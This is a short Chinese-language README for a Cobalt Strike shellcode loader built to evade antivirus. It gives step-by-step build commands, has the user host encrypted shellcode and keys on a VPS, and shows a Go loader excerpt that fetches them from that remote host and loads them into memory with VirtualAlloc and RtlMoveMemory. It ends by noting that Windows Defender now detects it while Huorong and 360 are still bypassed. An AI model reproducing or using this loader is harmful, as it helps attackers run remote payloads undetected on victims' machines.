> 1. CS加载Bypass_Remake.cna插件，生成shellcode和加密key1、key2、key3：

"Attack" > "BypassShellCode"

> 2. 生成加密器

**Win：** `go build -ldflags "-s -w" process_shellcode.go`

**Linux：** `GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" process_shellcode.go`

> 3. 将得到的shellcode和key的值分别做加密：

`process_shellcode.exe shellcode > sscode.txt`

`process_shellcode.exe key1 > ky1.txt`

`process_shellcode.exe key2 > ky2.txt`

`process_shellcode.exe key3 > ky3.txt`

> 4. 把key文件和shellcode文件，放在vps上，并用py起一个http服务端：

**Py2：** `python -m SimpleHTTPServer 8080`

**Py3：** `python3 -m http.server 8080`

> 5. 修改shellcode_loader.go中的vps请求地址即可：
```
var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlMoveMemory")
	URI           = "http://vps:8080/"
)
```

> 6. 编译go文件：

`go build -ldflags "-s -w -H windowsgui" shellcode_loader.go`

> 7. 运行shellcode_loader.exe即可

> WD已经杀了，火绒和360还是可以绕
